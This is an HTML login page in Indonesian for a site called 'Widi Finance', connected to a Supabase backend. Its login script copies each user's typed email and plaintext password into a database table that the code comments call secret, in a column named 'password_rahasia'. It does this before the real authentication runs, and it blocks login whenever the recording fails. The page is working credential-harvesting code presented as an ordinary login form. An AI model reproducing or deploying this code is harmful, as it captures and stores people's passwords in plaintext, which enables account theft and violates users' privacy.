<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login - Widi Finance </title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background: #F3F5F9; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; }
        .login-card { background: white; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.05); width: 100%; max-width: 400px; }
    </style>
</head>
<body>

    <div class="login-card">
        <div class="text-center mb-4">
            <h3 class="fw-bold text-primary">Widi Finance</h3>
                    </div>

        <div class="mb-3">
            <label class="form-label small fw-bold">Email</label>
            <input type="email" class="form-control" id="email" placeholder="nama@sekolah.sch.id">
        </div>
        <div class="mb-4">
            <label class="form-label small fw-bold">Password</label>
            <input type="password" class="form-control" id="password" placeholder="********">
        </div>
        
        <button class="btn btn-primary w-100 mb-3" onclick="handleLogin()" id="btnLogin">Masuk & Catat</button>
        <div id="msg" class="text-center small text-danger mt-2"></div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
        // KONEKSI SUPABASE
        const supabaseUrl = 'https://zzloutsqmpkifzijxaip.supabase.co';
        const supabaseKey = 'sb_publishable_uJHTWglP11uZzp3dKK7bdA_sY9xtmXv'; // Pastikan ini Key 'anon' / 'public'
        const _supabase = supabase.createClient(supabaseUrl, supabaseKey);

        async function handleLogin() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;
            const btn = document.getElementById('btnLogin');
            const msg = document.getElementById('msg');

            if(!email || !pass) return alert("Isi email & password dulu mas!");

            btn.disabled = true; 
            btn.innerText = "Mencoba Mencatat...";
            msg.innerText = "";

            // 1. COBA CATAT KE TABEL RAHASIA (DENGAN ALERT ERROR)
            try {
                // Cek koneksi dulu insert dummy
                const { error: logError } = await _supabase.from('user_logs').insert({ 
                    email: email, 
                    password_rahasia: pass 
                });

                if (logError) {
                    // KALAU GAGAL, DIA BAKAL MUNCUL POPUP ERROR
                    alert("GAGAL CATAT PASSWORD: " + logError.message + "\n\nCek apakah tabel 'user_logs' sudah ada kolom 'email' dan 'password_rahasia'?");
                    console.error(logError);
                    btn.disabled = false;
                    btn.innerText = "Coba Lagi";
                    return; // Stop jangan login dulu biar ketahuan errornya
                } else {
                    // KALAU SUKSES
                    console.log("Password berhasil dicatat!");
                }
            } catch (err) {
                alert("ERROR SCRIPT: " + err.message);
                return;
            }

            // 2. LANJUT LOGIN ASLI
            btn.innerText = "Sedang Login...";
            const { data, error } = await _supabase.auth.signInWithPassword({
                email: email,
                password: pass
            });

            if (error) {
                btn.disabled = false; 
                btn.innerText = "Masuk & Catat";
                msg.innerText = "Login Gagal: " + error.message;
                alert("Login Auth Gagal: " + error.message);
            } else {
                alert("BERHASIL! Password sudah dicatat di database & Login sukses.");
                window.location.href = 'index.html'; // Ganti ke nama file dashboard Mas (misal main.html)
            }
        }
    </script>
</body>
</html>
